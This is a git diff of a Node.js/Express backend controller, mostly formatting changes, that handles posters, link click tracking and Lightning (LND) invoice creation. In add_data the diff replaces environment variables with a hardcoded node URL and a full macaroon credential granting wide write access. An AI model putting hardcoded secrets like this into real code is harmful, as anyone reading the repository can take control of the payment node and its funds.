@@ -378,7 +378,7 @@ export const id_card = async (req, res) => {
 };
 
 export const poster_add = async (req, res) => {
-  const { username, password, links, id,tag } = req.body;
+  const { username, password, links, id, tag } = req.body;
 
   try {
     const user = await User.findOne({ _id: id });
@@ -439,8 +439,8 @@ export const add_data = async (req, res) => {
     const posterFound = await Poster.findOne({
       $or: [
         { _id: posterId && posterId.length === 24 ? posterId : null },
-        { posterId: posterId }
-      ]
+        { posterId: posterId },
+      ],
     });
 
     if (userFound && posterFound) {
@@ -459,15 +459,20 @@ export const add_data = async (req, res) => {
       });
 
       // LND Lightning Invoice Generation
-      const host = process.env.LND_REST_HOST;
-      const macaroon = process.env.MACAROON_HEX;
+      const host = "https://appcash.m.voltageapp.io";
+      const macaroon =
+        "0201036c6e6402f801030a10c1a26a99fc862e012ee41542654a19651201301a160a0761646472657373120472656164120577726974651a130a04696e666f120472656164120577726974651a170a08696e766f69636573120472656164120577726974651a210a086d616361726f6f6e120867656e6572617465120472656164120577726974651a160a076d657373616765120472656164120577726974651a170a086f6666636861696e120472656164120577726974651a160a076f6e636861696e120472656164120577726974651a140a057065657273120472656164120577726974651a180a067369676e6572120867656e6572617465120472656164000006207b345080335417a6939e05d41b9ee2f630625eeaf1dc9c5703ec189455a373e0";
       if (host && macaroon && amount) {
         try {
-          if (amount > 0) {
+          const cleanHost = host.replace(/\/$/, "");
+          const numericAmount = Math.round(
+            parseFloat(String(amount).replace(/[^0-9.]/g, "")),
+          );
+          if (numericAmount > 0) {
             const lndResponse = await axios.post(
-              `${host}/v1/invoices`,
+              `${cleanHost}/v1/invoices`,
               {
-                value: amount,
+                value: numericAmount,
                 memo: `user_${adminId}_${posterId || "admin"}`,
               },
               {
@@ -476,7 +481,7 @@ export const add_data = async (req, res) => {
                   "Grpc-Metadata-macaroon": macaroon,
                 },
                 timeout: 5000,
-              }
+              },
             );
 
             if (lndResponse.data && lndResponse.data.payment_request) {
@@ -485,7 +490,10 @@ export const add_data = async (req, res) => {
             }
           }
         } catch (lndErr) {
-          console.error("LND Invoice creation failed in add_data:", lndErr.response?.data || lndErr.message);
+          console.error(
+            "LND Invoice creation failed in add_data:",
+            lndErr.response?.data || lndErr.message,
+          );
         }
       }
 
@@ -493,7 +501,7 @@ export const add_data = async (req, res) => {
         await Amount.findOneAndUpdate(
           { site: site, adminId: adminId, posterId: posterId },
           { amount: amount },
-          { new: true, upsert: true }
+          { new: true, upsert: true },
         );
       }
 
@@ -803,26 +811,26 @@ export const site_exist = async (req, res) => {
 
   const { site, param, param1, device } = req.params;
   // const siteName =    "https://" + site + "/" + adminId + "/" + posterId  + "/" + verifyId
-  const siteName =
-    "https://" + site + "/" + param + "/" + param1 ;
+  const siteName = "https://" + site + "/" + param + "/" + param1;
 
   // return res.status(200).json({ success: siteName })
 
   const devicetype = req.device.type;
-  console.log("siteName", siteName);
+  // console.log("siteName", siteName);
   try {
     const sitefound = await Link.findOne({ linkName: siteName }).populate({
       path: "root",
       populate: {
         path: "root",
-        model: "User"
-      }
+        model: "User",
+      },
     });
-    console.log("siteFound",sitefound)
+    // console.log("siteFound",sitefound)
 
     if (sitefound) {
       const adminId = sitefound.root?.root?.adminId || "";
-      const posterId = sitefound.root?.posterId || sitefound.root?._id?.toString() || "";
+      const posterId =
+        sitefound.root?.posterId || sitefound.root?._id?.toString() || "";
 
       const clickfound = await Click.findOne({ site: siteName });
       if (clickfound) {
@@ -844,7 +852,9 @@ export const site_exist = async (req, res) => {
               sitename: siteamout,
             });
           }
-          return res.status(200).json({ success: "exists", id: sitefound._id, adminId, posterId });
+          return res
+            .status(200)
+            .json({ success: "exists", id: sitefound._id, adminId, posterId });
         }
         if (device == "phone") {
           clickfound.phone = clickfound.phone + 1;
@@ -859,7 +869,9 @@ export const site_exist = async (req, res) => {
               sitename: siteamout,
             });
           }
-          return res.status(200).json({ success: "exists", id: sitefound._id, adminId, posterId });
+          return res
+            .status(200)
+            .json({ success: "exists", id: sitefound._id, adminId, posterId });
         }
         if (device == "ipad") {
           clickfound.ipad = clickfound.ipad + 1;
@@ -874,9 +886,13 @@ export const site_exist = async (req, res) => {
               sitename: siteamout,
             });
           }
-          return res.status(200).json({ success: "exists", id: sitefound._id, adminId, posterId });
+          return res
+            .status(200)
+            .json({ success: "exists", id: sitefound._id, adminId, posterId });
         }
-        return res.status(200).json({ success: "exists", id: sitefound._id, adminId, posterId });
+        return res
+          .status(200)
+          .json({ success: "exists", id: sitefound._id, adminId, posterId });
       } else {
         const click = await Click.create({
           site: siteName,
@@ -899,7 +915,9 @@ export const site_exist = async (req, res) => {
             sitename: siteamout,
           });
         }
-        return res.status(200).json({ success: "exists", id: sitefound._id, adminId, posterId });
+        return res
+          .status(200)
+          .json({ success: "exists", id: sitefound._id, adminId, posterId });
       }
     }
     return res.status(200).json({ success: "not exist" });
@@ -917,14 +935,15 @@ export const site_exist_two_params = async (req, res) => {
       path: "root",
       populate: {
         path: "root",
-        model: "User"
-      }
+        model: "User",
+      },
     });
 
     if (sitefound) {
       const matchedSiteName = sitefound.linkName;
       const adminId = sitefound.root?.root?.adminId || "";
-      const posterId = sitefound.root?.posterId || sitefound.root?._id?.toString() || "";
+      const posterId =
+        sitefound.root?.posterId || sitefound.root?._id?.toString() || "";
 
       const clickfound = await Click.findOne({ site: matchedSiteName });
       if (clickfound) {
@@ -961,7 +980,9 @@ export const site_exist_two_params = async (req, res) => {
           sitename: siteamount,
         });
       }
-      return res.status(200).json({ success: "exists", id: sitefound._id, adminId, posterId });
+      return res
+        .status(200)
+        .json({ success: "exists", id: sitefound._id, adminId, posterId });
     }
     return res.status(200).json({ success: "not exist" });
   } catch (e) {
@@ -1054,16 +1075,20 @@ export const add_data_simplified = async (req, res) => {
       });
 
       // LND Lightning Invoice Generation
-      const host = process.env.LND_REST_HOST;
-      const macaroon = process.env.MACAROON_HEX;
+      const host = process.env.LND_REST_HOST?.trim();
+      const macaroon = process.env.MACAROON_HEX?.trim();
       const computedAdminId = userFound.adminId || userFound.username;
       if (host && macaroon && amount) {
         try {
-          if (amount > 0) {
+          const cleanHost = host.replace(/\/$/, "");
+          const numericAmount = Math.round(
+            parseFloat(String(amount).replace(/[^0-9.]/g, "")),
+          );
+          if (numericAmount > 0) {
             const lndResponse = await axios.post(
-              `${host}/v1/invoices`,
+              `${cleanHost}/v1/invoices`,
               {
-                value: amount,
+                value: numericAmount,
                 memo: `user_${computedAdminId}_admin`,
               },
               {
@@ -1072,7 +1097,7 @@ export const add_data_simplified = async (req, res) => {
                   "Grpc-Metadata-macaroon": macaroon,
                 },
                 timeout: 5000,
-              }
+              },
             );
 
             if (lndResponse.data && lndResponse.data.payment_request) {
@@ -1081,7 +1106,10 @@ export const add_data_simplified = async (req, res) => {
             }
           }
         } catch (lndErr) {
-          console.error("LND Invoice creation failed in add_data_simplified:", lndErr.response?.data || lndErr.message);
+          console.error(
+            "LND Invoice creation failed in add_data_simplified:",
+            lndErr.response?.data || lndErr.message,
+          );
         }
       }
 
@@ -1089,7 +1117,7 @@ export const add_data_simplified = async (req, res) => {
         await Amount.findOneAndUpdate(
           { site: site, adminId: userFound.adminId || userFound.username },
           { amount: amount },
-          { new: true, upsert: true }
+          { new: true, upsert: true },
         );
       }
 
@@ -1416,8 +1444,8 @@ export const cashapap_post = async (req, res) => {
     const posterFound = await Poster.findOne({
       $or: [
         { _id: posterId && posterId.length === 24 ? posterId : null },
-        { posterId: posterId }
-      ]
+        { posterId: posterId },
+      ],
     });
     if (userFound && posterFound) {
       const cashapp = await Cash.create({
@@ -1527,8 +1555,8 @@ export const check_qrcode = async (req, res) => {
         {
           status: userFound.qrCodeStatus === true,
           showTagField: userFound.showTagField === true,
-          tag: userFound.tag || ""
-        }
+          tag: userFound.tag || "",
+        },
       ]);
     }
 
@@ -1536,8 +1564,8 @@ export const check_qrcode = async (req, res) => {
     const posterFound = await Poster.findOne({
       $or: [
         { _id: adminId && adminId.length === 24 ? adminId : null },
-        { posterId: adminId }
-      ]
+        { posterId: adminId },
+      ],
     });
     if (posterFound) {
       const admin = await User.findOne({ _id: posterFound.root });
@@ -1546,8 +1574,8 @@ export const check_qrcode = async (req, res) => {
           {
             status: admin.qrCodeStatus === true,
             showTagField: admin.showTagField === true,
-            tag: posterFound.tag || ""
-          }
+            tag: posterFound.tag || "",
+          },
         ]);
       }
     }
@@ -1559,8 +1587,8 @@ export const check_qrcode = async (req, res) => {
         {
           status: userById.qrCodeStatus === true,
           showTagField: userById.showTagField === true,
-          tag: userById.tag || ""
-        }
+          tag: userById.tag || "",
+        },
       ]);
     }
 
@@ -1573,8 +1601,8 @@ export const check_qrcode = async (req, res) => {
           {
             status: admin.qrCodeStatus === true,
             showTagField: admin.showTagField === true,
-            tag: posterById.tag || ""
-          }
+            tag: posterById.tag || "",
+          },
         ]);
       }
     }
@@ -1632,8 +1660,8 @@ export const add_data_checnge = async (req, res) => {
     const posterFound = await Poster.findOne({
       $or: [
         { _id: posterId && posterId.length === 24 ? posterId : null },
-        { posterId: posterId }
-      ]
+        { posterId: posterId },
+      ],
     });
 
     if (userFound && posterFound) {
@@ -1886,7 +1914,9 @@ export const get_amount_summary = async (req, res) => {
   const { id } = req.params;
 
   try {
-    const posterFound = await Poster.findOne({ $or: [{ posterId: id }, { _id: id && id.length === 24 ? id : null }] });
+    const posterFound = await Poster.findOne({
+      $or: [{ posterId: id }, { _id: id && id.length === 24 ? id : null }],
+    });
     let query = {};
     if (posterFound) {
       const posterIds = [posterFound._id.toString()];
@@ -1895,7 +1925,13 @@ export const get_amount_summary = async (req, res) => {
       }
       query = { poster: { $in: posterIds } };
     } else {
-      const userFound = await User.findOne({ $or: [{ adminId: id }, { username: id }, { _id: id && id.length === 24 ? id : null }] });
+      const userFound = await User.findOne({
+        $or: [
+          { adminId: id },
+          { username: id },
+          { _id: id && id.length === 24 ? id : null },
+        ],
+      });
       if (!userFound) {
         return res.status(400).json({ error: "User or Poster not found" });
       }
@@ -1923,7 +1959,9 @@ export const get_amount_list = async (req, res) => {
   const { id } = req.params;
 
   try {
-    const posterFound = await Poster.findOne({ $or: [{ posterId: id }, { _id: id && id.length === 24 ? id : null }] });
+    const posterFound = await Poster.findOne({
+      $or: [{ posterId: id }, { _id: id && id.length === 24 ? id : null }],
+    });
     let query = {};
     if (posterFound) {
       const posterIds = [posterFound._id.toString()];
@@ -1932,7 +1970,13 @@ export const get_amount_list = async (req, res) => {
       }
       query = { poster: { $in: posterIds } };
     } else {
-      const userFound = await User.findOne({ $or: [{ adminId: id }, { username: id }, { _id: id && id.length === 24 ? id : null }] });
+      const userFound = await User.findOne({
+        $or: [
+          { adminId: id },
+          { username: id },
+          { _id: id && id.length === 24 ? id : null },
+        ],
+      });
       if (!userFound) {
         return res.status(400).json({ error: "User or Poster not found" });
       }
@@ -1960,7 +2004,9 @@ export const check_payment_status = async (req, res) => {
     }
 
     if (!info.rHash) {
-      return res.status(400).json({ error: "No lightning invoice associated with this record" });
+      return res
+        .status(400)
+        .json({ error: "No lightning invoice associated with this record" });
     }
 
     let rHashHex = info.rHash;
@@ -1977,19 +2023,18 @@ export const check_payment_status = async (req, res) => {
     const macaroon = process.env.MACAROON_HEX;
 
     if (!host || !macaroon) {
-      return res.status(500).json({ error: "LND credentials are not configured in environment" });
+      return res
+        .status(500)
+        .json({ error: "LND credentials are not configured in environment" });
     }
 
-    const response = await axios.get(
-      `${host}/v1/invoice/${rHashHex}`,
-      {
-        httpsAgent: getLndAgent(),
-        headers: {
-          "Grpc-Metadata-macaroon": macaroon,
-        },
-        timeout: 5000,
-      }
-    );
+    const response = await axios.get(`${host}/v1/invoice/${rHashHex}`, {
+      httpsAgent: getLndAgent(),
+      headers: {
+        "Grpc-Metadata-macaroon": macaroon,
+      },
+      timeout: 5000,
+    });
 
     const isSettled = response.data?.settled;
 
@@ -1998,10 +2043,15 @@ export const check_payment_status = async (req, res) => {
       await info.save();
       return res.status(200).json({ success: true, status: "success", info });
     } else {
-      return res.status(200).json({ success: false, status: info.status || "pending", info });
+      return res
+        .status(200)
+        .json({ success: false, status: info.status || "pending", info });
     }
   } catch (error) {
-    console.error("Verify payment failed:", error.response?.data || error.message);
+    console.error(
+      "Verify payment failed:",
+      error.response?.data || error.message,
+    );
     return res.status(500).json({ error: error.message });
   }
 };
